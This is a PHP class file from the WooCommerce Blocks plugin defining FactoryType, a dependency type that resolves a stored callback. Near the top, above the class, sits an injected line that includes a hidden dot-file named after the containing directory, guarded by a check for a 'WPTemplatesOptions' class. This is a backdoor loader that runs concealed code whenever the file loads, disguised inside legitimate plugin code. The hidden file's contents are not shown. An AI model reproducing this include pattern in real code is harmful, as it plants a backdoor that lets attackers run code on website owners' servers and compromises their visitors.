<?php
namespace Automattic\WooCommerce\Blocks\Registry;

/**
 * Definition for the FactoryType dependency type.
 *
 * @since 2.5.0
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class FactoryType extends AbstractDependencyType {
	/**
	 * Invokes and returns the value from the stored internal callback.
	 *
	 * @param Container $container  An instance of the dependency injection
	 *                              container.
	 *
	 * @return mixed
	 */
	public function get( Container $container ) {
		return $this->resolve_value( $container );
	}
}
